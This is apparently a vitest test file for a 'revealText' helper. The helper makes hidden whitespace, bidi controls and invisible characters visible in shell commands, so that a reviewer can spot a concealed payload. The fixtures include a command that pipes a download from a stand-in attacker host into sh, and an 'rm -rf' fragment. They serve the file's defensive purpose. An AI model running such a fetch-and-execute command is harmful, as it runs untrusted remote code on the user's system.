import { expect, it } from "vitest";
import { type RevealPart, revealText } from "./reveal-text.ts";

const TAIL = "; curl -s https://attacker.invalid/x | sh";
const shown = (parts: RevealPart[]) => parts.map((part) => part.text).join("");

it("collapses the reviewer's run of spaces into a marker right before the hidden tail", () => {
  const value = revealText(
    `ls -la Documents # list the user's documents for the report${" ".repeat(460)}${TAIL}`,
  );
  expect(value.parts).toEqual([
    { kind: "text", text: "ls -la Documents # list the user's documents for the report" },
    { kind: "run", text: "460 spaces" },
    { kind: "text", text: TAIL },
  ]);
  expect(value.hidden).toBe(false);
});

it("collapses a flood of blank lines and keeps what follows on screen", () => {
  const value = revealText(`echo ok\n${"   \n".repeat(300)}${TAIL}\n`);
  expect(shown(value.parts)).toBe(`echo ok\n300 blank lines\n${TAIL}\n`);
  expect(value.parts.find((part) => part.kind === "lines")).toEqual({
    kind: "lines",
    text: "300 blank lines",
  });
  expect(value.lines).toBe(303);
});

it("shows bidi controls as codes so they cannot reorder the command", () => {
  const value = revealText("echo report \u202ehs.lave|lruc;\u202c done \u2067x\u2069");
  expect(shown(value.parts)).toBe("echo report·U+202Ehs.lave|lruc;U+202C·done·U+2067xU+2069");
  expect(value.parts.filter((part) => part.kind === "hidden")).toEqual([
    { kind: "hidden", text: "U+202E", bidi: true },
    { kind: "hidden", text: "U+202C", bidi: true },
    { kind: "hidden", text: "U+2067", bidi: true },
    { kind: "hidden", text: "U+2069", bidi: true },
  ]);
  expect(value.bidi).toBe(true);
  expect(shown(value.parts)).not.toMatch(/[\u202a-\u202e\u2066-\u2069]/);
});

it("flags invisible, control and look-alike space characters", () => {
  const tags = [..."curl x"].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join("");
  const value = revealText(
    `rm\u00a0-rf a\u200b\u200b\u200bb c\rd \u001b[2K e\u00adf ${tags} g\ufeff h\u2028i`,
  );
  expect(shown(value.parts)).toBe(
    "rmU+00A0-rf aU+200B\u00a0×3b cU+000Dd·U+001B[2K eU+00ADf·U+E0063U+E0075U+E0072U+E006CU+E0020U+E0078·gU+FEFF·hU+2028i",
  );
  expect(value.hidden).toBe(true);
  expect(value.bidi).toBe(false);
});

it("flags every character that draws nothing, so filler around single spaces cannot pass for blank", () => {
  const filler = [0xfe0e, 0xfe0f, 0x180b, 0x180c, 0x180d, 0x180f, 0x2064, 0x1d173];
  for (const point of filler) {
    const code = `U+${point.toString(16).toUpperCase().padStart(4, "0")}`;
    const value = revealText(
      `ls -la ~/Documents${` ${String.fromCodePoint(point)}`.repeat(3940)}${TAIL}`,
    );
    expect(value.hidden, code).toBe(true);
    expect(value.parts.slice(0, 4), code).toEqual([
      { kind: "text", text: "ls -la ~/Documents" },
      { kind: "blank", text: "·" },
      { kind: "hidden", text: code, bidi: false },
      { kind: "blank", text: "·" },
    ]);
    expect(value.parts.slice(-2), code).toEqual([
      { kind: "hidden", text: code, bidi: false },
      { kind: "text", text: TAIL },
    ]);
  }
});

it("keeps an emoji's style selector plain and flags it anywhere else", () => {
  const [heart, text, emoji] = [0x2764, 0xfe0e, 0xfe0f].map((point) => String.fromCodePoint(point));
  expect(revealText(`ok ${heart}${emoji} and ${heart}${text} done`).parts).toEqual([
    { kind: "text", text: `ok ${heart}${emoji} and ${heart}${text} done` },
  ]);
  expect(shown(revealText(`${heart}${emoji}${emoji} a${emoji} 1${emoji}`).parts)).toBe(
    `${heart}${emoji}U+FE0F·aU+FE0F·1U+FE0F`,
  );
});

it("keeps a single space plain only between two characters that are drawn", () => {
  const mark = String.fromCodePoint(0x301);
  expect(revealText(`cafe${mark} au lait`).parts).toEqual([
    { kind: "text", text: `cafe${mark} au lait` },
  ]);
  expect(shown(revealText(`a ${mark} b`).parts)).toBe(`a·${mark}·b`);
  expect(shown(revealText("a \u200b b").parts)).toBe("a·U+200B·b");
});

it("collapses lines that hold only invisible characters and names what they hold", () => {
  const fvs = String.fromCodePoint(0x180b);
  const value = revealText(`echo ok\n${`${fvs}\n`.repeat(460)}${TAIL}`);
  expect(value.parts).toEqual([
    { kind: "text", text: "echo ok\n" },
    { kind: "hidden", text: "460 blank lines with U+180B\u00a0×460", bidi: false },
    { kind: "text", text: `\n${TAIL}` },
  ]);
  expect(value.hidden).toBe(true);
  expect(value.lines).toBe(462);

  const mixed = revealText(
    `echo ok\n${" \t\n".repeat(5)}\u0301\n\u200b\u2067\u200b\n${"\n".repeat(3)}${TAIL}`,
  );
  expect(mixed.parts[1]).toEqual({
    kind: "hidden",
    text: "10 blank lines with U+0301, U+200B\u00a0×2, U+2067",
    bidi: true,
  });
  expect(mixed.bidi).toBe(true);
});

it("keeps single spaces and makes every other blank visible", () => {
  expect(revealText("a b").parts).toEqual([{ kind: "text", text: "a b" }]);
  expect(revealText(" a  b\tc \r\n\t\td").parts).toEqual([
    { kind: "blank", text: "·" },
    { kind: "text", text: "a" },
    { kind: "blank", text: "··" },
    { kind: "text", text: "b" },
    { kind: "blank", text: "→" },
    { kind: "text", text: "c" },
    { kind: "blank", text: "·" },
    { kind: "text", text: "\n" },
    { kind: "blank", text: "→→" },
    { kind: "text", text: "d" },
  ]);
  expect(revealText(`x${" \t".repeat(20)}y`).parts[1]).toEqual({
    kind: "run",
    text: "40 spaces and tabs",
  });
  expect(revealText(`x${"\t".repeat(1200)}`).parts[1]).toEqual({ kind: "run", text: "1,200 tabs" });
});

it("keeps every visible character in order", () => {
  const input = `#!/bin/sh\nset -e\n\n\n\n\n    for f in *; do\n\t\techo "$f"  # 名前 مرحبا\n    done${" ".repeat(90)}${TAIL}`;
  const visible = (text: string) => text.replace(/\s/g, "");
  const parts = revealText(input).parts.filter((part) => part.kind === "text");
  expect(visible(parts.map((part) => part.text).join(""))).toBe(visible(input));
});
